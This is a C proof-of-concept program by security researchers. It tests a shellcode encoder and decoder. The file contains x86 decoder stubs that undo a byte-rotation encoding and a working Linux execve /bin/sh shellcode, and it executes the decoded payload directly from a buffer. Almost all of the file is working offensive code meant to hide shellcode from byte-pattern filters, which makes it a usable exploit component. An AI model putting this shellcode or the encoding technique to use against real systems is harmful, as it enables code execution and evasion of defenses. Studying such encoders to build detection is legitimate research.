/*
 * Proof-of-concept to test the decoder
 *
 * Rodrigo Rubira Branco <rodrigo@kernelhacking.com>
 * Thanks to Ramon de Carvalho Valle <ramon@risesecurity.org>
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void print_code(char *data);

char decoderl[]=            /*  20 bytes                          */
    "\x31\xc9"              /*  xorl    %ecx,%ecx                 */
    "\xb1\x00"              /*  movb    $0x??,%cl                 */
    "\xeb\x09"              /*  jmp     <decoder+15>              */
    "\x5e"                  /*  popl    %esi                      */
    "\xc0\x06\x01"          /*  rolb    $0x01,(%esi)              */ // move 2 bits left
    "\x46"                  /*  incl    %esi                      */
    "\xe2\xfa"              /*  loop    <decoder+7>               */
    "\xeb\x05"              /*  jmp     <decoder+20>              */
    "\xe8\xf2\xff\xff\xff"  /*  call    <decoder+6>               */
;

char decoderr[]=            /*  20 bytes                          */
    "\x31\xc9"              /*  xorl    %ecx,%ecx                 */
    "\xb1\x00"              /*  movb    $0x??,%cl                 */
    "\xeb\x09"              /*  jmp     <decoder+15>              */
    "\x5e"                  /*  popl    %esi                      */
    "\xc0\x0e\x02"          /*  rorb    $0x2,(%esi)               */
    "\x46"                  /*  incl    %esi                      */
    "\xe2\xfa"              /*  loop    <decoder+7>               */
    "\xeb\x05"              /*  jmp     <decoder+20>              */
    "\xe8\xf2\xff\xff\xff"  /*  call    <decoder+6>               */
;

/* Linux execve /bin/sh shellcode */
char shellcode[]=           /*  24 bytes                          */
    "\x31\xc0"              /*  xorl    %eax,%eax                 */
    "\x50"                  /*  pushl   %eax                      */
    "\x68\x2f\x2f\x73\x68"  /*  pushl   $0x68732f2f               */
    "\x68\x2f\x62\x69\x6e"  /*  pushl   $0x6e69622f               */
    "\x89\xe3"              /*  movl    %esp,%ebx                 */
    "\x50"                  /*  pushl   %eax                      */
    "\x53"                  /*  pushl   %ebx                      */
    "\x89\xe1"              /*  movl    %esp,%ecx                 */
    "\x99"                  /*  cltd                              */
    "\xb0\x0b"              /*  movb    $0x0b,%al                 */
    "\xcd\x80"              /*  int     $0x80                     */
;


main(int argc,char **argv) {
    char buffer[16384],*p;
    int i,l;

    decoderl[3]=(unsigned char)strlen(shellcode);
    decoderr[3]=(unsigned char)strlen(shellcode);

    for(i=0;i<strlen(shellcode);i++) {
        __asm__(
            "movl    %0,%%esi\n"
            "addl    %1,%%esi\n"
            "rorb    $0x01,(%%esi)\n"
            :
            : "g" (shellcode), "g" (i)
            : "si", "memory"
        );
    }


    p=buffer;    
    for(i=0;i<strlen(decoderl);i++) *p++=decoderl[i];
    //for(i=0;i<strlen(decoderr);i++) *p++=decoderr[i];
    for(i=0;i<strlen(shellcode);i++) *p++=shellcode[i];
    p=0;

	// print decoder
	// print_code(decoderr);
	// print_code(decoderl);
	// print shellcode
	print_code(shellcode);

    (*(void (*)())buffer)();
}



void print_code(char *data) {

  int i,l = 15;

  printf("\n\nchar code[] =\n");

  for (i = 0; i < strlen(data); ++i) {
    if (l >= 15) {
      if (i)
        printf("\"\n");
      printf("\t\"");
      l = 0;
    }
    ++l;
    printf("\\x%02x", ((unsigned char *)data)[i]);
  }
  printf("\";\n\n\n");
}
